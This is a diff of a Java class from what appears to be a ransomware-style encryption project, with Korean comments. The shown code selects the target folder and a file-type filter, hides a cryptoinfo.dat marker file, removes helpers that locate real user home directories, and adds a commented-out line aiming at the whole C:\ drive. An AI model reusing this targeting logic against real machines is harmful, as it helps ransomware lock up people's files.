@@ -30,16 +30,12 @@ public class SearchDirectory {
          * 본인의 컴퓨터가 암호화 될 수 있습니다
          **/
 
-        //1. 암호화 할 경로 설정
-        //C:\test 폴더가 있어야됨
         isWindow = true;
         setDefaultDirectory("C:\\test");
 
+        //setDefaultDirectory("C:\\");
 
-        //이거 무서워서 못함
-        //setDefaultDirectory();
 
-        //2. 암호화할 파일 타입을 설정
         initContainFilter();
     }
 
@@ -73,7 +69,6 @@ public class SearchDirectory {
                     Path path = FileSystems.getDefault().getPath(defaultDirectory, "cryptoinfo.dat");
                     Files.setAttribute(path, "dos:hidden", true);
                 } else {
-                    // Mac에서도 파일 숨기게 만들어줘
                     FileOutputStream output = new FileOutputStream(defaultDirectory + "/cryptoinfo.dat");
                     output.close();
                 }
@@ -286,7 +281,7 @@ public class SearchDirectory {
     /**
      * OS별 최상위 디렉토리 설정
      */
-    private void setDefaultDirectory() {
+    /*private void setDefaultDirectory() {
         String os = System.getProperty("os.name").split(" ")[0];
         switch (os) {
             case "Mac":
@@ -300,7 +295,7 @@ public class SearchDirectory {
                 break;
         }
     }
-
+*/
     /**
      * 최상위 디렉토리 사용자 설정
      *
@@ -308,46 +303,6 @@ public class SearchDirectory {
      */
     private void setDefaultDirectory(String defaultDirectory) {
         this.defaultDirectory = defaultDirectory;
-    }
-
-    /**
-     * 기본 디렉토리 설정 : Mac 용
-     */
-    private void setMacDefaultDirectory() {
-        File macDir = new File("/Users/");
-        File[] fileList = macDir.listFiles();
-        try {
-            if (fileList != null) {
-                for (File file : fileList) {
-                    System.out.println(file.getName());
-                    if (!file.getName().equals("Guest") && !file.getName().equals("Shared")) {
-                        this.defaultDirectory = file.getCanonicalPath();
-                    }
-                }
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-
-    /**
-     * 기본 디렉토리 설정 : Windows 용
-     */
-    private void setWindowDefaultDirectory() {
-        File windowDir = new File(System.getenv("SystemDrive") + "\\Users\\");
-        File[] fileList = windowDir.listFiles();
-        try {
-            if (fileList != null) {
-                for (File file : fileList) {
-                    if (!file.getName().equals("Public")) {
-                        this.defaultDirectory = file.getCanonicalPath();
-                    }
-                }
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
     }
 
     /**
